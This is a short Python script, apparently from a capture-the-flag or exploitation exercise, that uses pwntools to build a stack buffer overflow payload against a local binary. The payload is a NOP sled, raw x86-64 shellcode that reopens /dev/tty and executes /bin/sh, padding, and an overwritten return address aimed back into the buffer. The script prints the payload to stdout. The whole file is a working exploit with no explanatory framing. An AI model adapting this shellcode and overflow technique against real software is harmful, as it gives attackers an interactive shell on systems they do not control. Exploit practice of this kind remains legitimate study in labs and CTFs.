import sys
from pwn import *

buffer_length = 208
stack_size = 264
shellcode = b'\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05'
buffer_addr = p64(0xf8e1ffffff7f0000)
buffer_addr = p64(int.from_bytes(buffer_addr, 'big') - 248)

payload = asm('nop') * (buffer_length - len(shellcode)) + shellcode + b'a' * (stack_size - buffer_length) + buffer_addr + b'\n' + b'\x00' * 2

sys.stdout.buffer.write(payload)
